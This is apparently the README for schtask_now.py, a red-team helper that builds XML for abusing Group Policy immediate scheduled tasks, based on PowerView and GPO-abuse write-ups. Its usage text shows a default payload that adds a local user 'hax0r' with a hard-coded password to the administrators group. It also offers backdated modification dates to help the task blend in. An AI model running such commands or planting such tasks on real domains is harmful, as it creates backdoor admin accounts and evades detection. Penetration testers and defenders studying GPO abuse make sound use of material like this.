# schtask_now
Generate XML file for "immediate scheduled task" GPO configuration. Template borrowed from
https://github.com/rasta-mouse/GPO-Abuse/blob/master/scheduled-tasks.md and
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
(see New-GPOImmediateTask - note this function has been discontinued in the latest version
of PowerView). One improvement I made (I mean I think it's an improvement :)) is that the
commands are appropriately XML encoded (i.e. & -> &amp; etc.)
For usage info see https://rastamouse.me/2019/01/gpo-abuse-part-2/.

```
usage: schtask_now.py [-h] [-n NAME] [-m DATE] [-d DESCRIPTION] [-c COMMAND]
                      [-a ARGS]

optional arguments:
  -h, --help            show this help message and exit
  -n NAME, --name NAME  name for the scheduled task, if not provided a random
                        name in the form of 'TASK_########' is generated.
  -m DATE, --date DATE  specify task modification date, should be in 'YYYY-MM-
                        DD HH:MM:SS' format. If not provided current date -30
                        days is used.
  -d DESCRIPTION, --description DESCRIPTION
                        specify task description, if not provided empty
                        description is used.
  -c COMMAND, --command COMMAND
                        command to execute, defaults to
                        'c:\windows\system32\cmd.exe'
  -a ARGS, --args ARGS  command arguments, defaults to '/c "net user hax0r
                        Super1337 /add && net localgroup administrators hax0r
                        /add"'
```